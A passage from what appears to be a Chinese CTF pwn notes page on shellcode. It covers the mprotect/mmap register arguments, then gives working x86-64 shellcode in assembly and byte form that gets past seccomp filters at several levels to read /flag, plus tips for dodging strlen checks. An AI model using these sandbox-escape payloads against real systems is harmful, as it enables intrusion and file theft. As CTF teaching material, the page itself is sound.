+<p><code class="language-carbon highlight"><span class="nx">int</span><span class="w"> </span><span class="nx">mprotect</span><span class="p">(</span><span class="nx">void</span><span class="w"> </span><span class="o">*</span><span class="kd">addr</span><span class="p">,</span><span class="w"> </span><span class="nx">size_t</span><span class="w"> </span><span class="nx">len</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">prot</span><span class="p">)</span></code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>对应寄存器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>addr</td>
+<td>rdi</td>
+<td>内存起始地址</td>
+</tr>
+<tr>
+<td>len</td>
+<td>rsi</td>
+<td>处理的长度</td>
+</tr>
+<tr>
+<td>proc</td>
+<td>rdx</td>
+<td>保护（1为r,2为w,4为x)</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>利用mmap类函数申请开辟特定权限的空间</li>
+</ul>
+<p><code class="language-scdoc highlight">void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset)</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>对应寄存器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>start</td>
+<td>rdi</td>
+<td>开始地址，0表示系统指定</td>
+</tr>
+<tr>
+<td>length</td>
+<td>rsi</td>
+<td>映射区长度，不足一页按照一页来处理</td>
+</tr>
+<tr>
+<td>prot</td>
+<td>rdx</td>
+<td>保护标志，同上</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>r10</td>
+<td>映射对象的类型，一般设置22</td>
+</tr>
+<tr>
+<td>fd</td>
+<td>r8</td>
+<td>文件描述符，设置-1就可以</td>
+</tr>
+<tr>
+<td>offset</td>
+<td>r9</td>
+<td>被映射对象内容的起点</td>
+</tr>
+</tbody>
+</table>
+<h2 id="seccomp">seccomp绕过</h2>
+<h4 id="level1-openreadwrite">level1 开放open,read,write</h4>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nf">push</span><span class="w">   </span><span class="mi">0x67616c66</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nf">mov</span><span class="w">    </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="nf">xor</span><span class="w">    </span><span class="no">esi</span><span class="p">,</span><span class="w"> </span><span class="no">esi</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="nf">push</span><span class="w">   </span><span class="mi">0x2</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="nf">pop</span><span class="w">    </span><span class="no">rax</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="nf">syscall</span><span class="w"> </span>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="no">mov</span><span class="w">    </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="nf">mov</span><span class="w">    </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="nf">mov</span><span class="w">    </span><span class="no">edx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x100</span>
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="nf">xor</span><span class="w">    </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="no">eax</span>
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="nf">syscall</span><span class="w"> </span>
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="no">mov</span><span class="w">    </span><span class="no">edi</span><span class="p">,</span><span class="w"> </span><span class="mi">0x1</span>
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="nf">mov</span><span class="w">    </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="nf">push</span><span class="w">   </span><span class="mi">0x1</span>
+<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a><span class="nf">pop</span><span class="w">    </span><span class="no">rax</span>
+<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="nf">syscall</span>
+</code></pre></div>
+<h4 id="level2-open">level2 关闭open</h4>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">0x0067616c662f</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="no">rdx</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">257</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="nf">syscall</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="no">rdi</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="nf">inc</span><span class="w"> </span><span class="no">rdi</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="no">rdx</span>
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="nf">mov</span><span class="w"> </span><span class="no">r10</span><span class="p">,</span><span class="mi">0x100</span><span class="w"> </span><span class="c1"># 读取文件的长度,不够就加</span>
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">40</span>
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="nf">syscall</span>
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>b&#39;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05&#39;
+</code></pre></div>
+<h4 id="level3-openat-readv-writev">level3 openat readv writev</h4>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">0x0067616c662f</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="no">rdx</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">257</span>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="nf">syscall</span>
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x100</span><span class="w"> </span><span class="c1"># 读入大小由这个控制</span>
+<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rbx</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="nf">sub</span><span class="w"> </span><span class="no">rbx</span><span class="p">,</span><span class="mi">0x108</span><span class="w"> </span><span class="c1"># 为读入大小加8</span>
+<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="nf">push</span><span class="w"> </span><span class="no">rbx</span>
+<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="mi">1</span>
+<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">19</span>
+<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="nf">syscall</span>
+<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="mi">1</span>
+<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="mi">1</span>
+<a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">20</span>
+<a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a><span class="nf">syscall</span>
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>b&#39;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H\x89\xc7h\x00\x01\x00\x00H\x89\xe3H\x81\xeb\x08\x01\x00\x00SH\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x13\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x14\x00\x00\x00\x0f\x05&#39;
+</code></pre></div>
+<h4 id="level35-openat2-read-write">level3.5 openat2 read write</h4>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0x67616c66</span><span class="w"> </span><span class="c1"># 路径</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="no">rdi</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="nf">sub</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">100</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0</span>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0</span>
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="nf">mov</span><span class="w"> </span><span class="no">r10</span><span class="p">,</span><span class="w"> </span><span class="mi">0x18</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="nf">push</span><span class="w"> </span><span class="no">SYS_openat2</span><span class="w"> </span><span class="c1"># pwntools预定义的系统调用号,也可以手动查</span>
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="nf">syscall</span>
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="nf">mov</span><span class="w"> </span><span class="no">edx</span><span class="p">,</span><span class="mi">0x100</span>
+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="nf">xor</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
+<a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="nf">syscall</span>
+<a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a><span class="nf">mov</span><span class="w"> </span><span class="no">edi</span><span class="p">,</span><span class="mi">1</span>
+<a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a><span class="nf">push</span><span class="w"> </span><span class="mi">1</span>
+<a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a><span class="nf">syscall</span>
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>b&#39;H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05&#39;
+</code></pre></div>
+<h2 id="tips">Tips</h2>
+<ul>
+<li>有些题目对shellcode的检查可能用到了strlen或别的什么str类型函数，这个时候可以直接在shellcode前加一个\x00起手的指令，绕过判断</li>
+<li>在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址</li>
+<li>在32位程序中，还可以通过call指令获取将运行地址压入栈中</li>
+<li>在64位地址中，可以直接通过 <code class="language-tsql highlight"><span class="n">lea</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rip</span><span class="o">]</span></code> 来获取rip地址</li>
+<li>有些时候如果开启了PIE、ASLR保护，地址未知，可以尝试泄露fs寄存器中的值，可以见<a href="https://powchan.github.io/2025/03/31/WHUCTF2025-pwn-wp/#shell-for-another-shell">这篇</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="md-typeset" style="margin-top: 2rem;">
+  
+    <nav class="post-nav" aria-label="文章分页导航">
+      
+        <a class="post-nav__link post-nav__link--prev" href="../fmt-all-in-one/">
+          <span class="post-nav__label">上一篇</span>
+          <span class="post-nav__title">格式化字符串</span>
+        </a>
+      
+      
+        <a class="post-nav__link post-nav__link--next" href="../SROP/">
+          <span class="post-nav__label">下一篇</span>
+          <span class="post-nav__title">SROP</span>
+        </a>
+      
+    </nav>
+  
+
+  <h2 id="__comments">评论</h2>
+  
+  <script>
+    var giscusTheme = document.body.getAttribute("data-md-color-scheme") === "slate" ? "dark_dimmed" : "light";
+    
+    var giscusScript = document.createElement("script");
+    giscusScript.src = "https://giscus.app/client.js";
+    giscusScript.setAttribute("data-repo", "maple-pwn/maple-pwn.github.io");
+    giscusScript.setAttribute("data-repo-id", "R_kgDOP5uLTQ");
+    giscusScript.setAttribute("data-category", "Comments");
+    giscusScript.setAttribute("data-category-id", "DIC_kwDOP5uLTc4C130e");
+    giscusScript.setAttribute("data-mapping", "pathname");
+    giscusScript.setAttribute("data-strict", "0");
+    giscusScript.setAttribute("data-reactions-enabled", "1");
+    giscusScript.setAttribute("data-emit-metadata", "0");
+    giscusScript.setAttribute("data-input-position", "bottom");
+    giscusScript.setAttribute("data-theme", giscusTheme);
+    giscusScript.setAttribute("data-lang", "zh-CN");
+    giscusScript.setAttribute("data-loading", "lazy");
+    giscusScript.setAttribute("crossorigin", "anonymous");
+    giscusScript.async = true;
+    
+    document.getElementById("__comments").insertAdjacentElement("afterend", giscusScript);
+    
+    // Theme sync
+    var observer = new MutationObserver(function(mutations) {
+      mutations.forEach(function(mutation) {
+        if (mutation.attributeName === "data-md-color-scheme") {
+          var theme = document.body.getAttribute("data-md-color-scheme") === "slate" ? "dark_dimmed" : "light";
+          var iframe = document.querySelector(".giscus-frame");
+          if (iframe) {
+            iframe.contentWindow.postMessage(
+              { giscus: { setConfig: { theme: theme } } },
+              "https://giscus.app"
+            );
+          }
+        }
+      });
+    });
+    observer.observe(document.body, { attributes: true });
+  </script>
+</div>
+
+                
+
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.titles", "navigation.tabs", "navigation.top"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../resources/js/mathjax-config.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../../resources/js/read-metrics.js"></script>
+      
+        <script src="../../../resources/js/sidebar-resize.js"></script>
+      
+    
+  </body>
+</html>
